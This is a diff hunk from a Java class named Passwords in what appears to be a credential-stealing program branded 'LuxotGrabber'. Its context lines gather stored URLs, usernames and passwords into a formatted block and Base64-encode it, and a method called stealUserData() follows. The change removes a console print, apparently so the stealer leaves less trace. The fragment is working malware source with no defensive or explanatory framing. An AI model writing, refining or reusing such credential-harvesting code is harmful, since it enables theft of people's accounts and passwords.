@@ -46,7 +46,6 @@ public class Passwords {
         {
             pswdStr += "\n=========<LuxotGrabber>==========\nURL: " + pswd.getAsJsonObject().get("url").getAsString() + "\nUSER: " + pswd.getAsJsonObject().get("username").getAsString() + "\nPASS: " + pswd.getAsJsonObject().get("password").getAsString() + "\n=========<LuxotGrabber>==========\n";
         }
-        System.out.println(pswdStr);
         return Base64.getEncoder().encodeToString(pswdStr.getBytes());
     }
     private void stealUserData() {
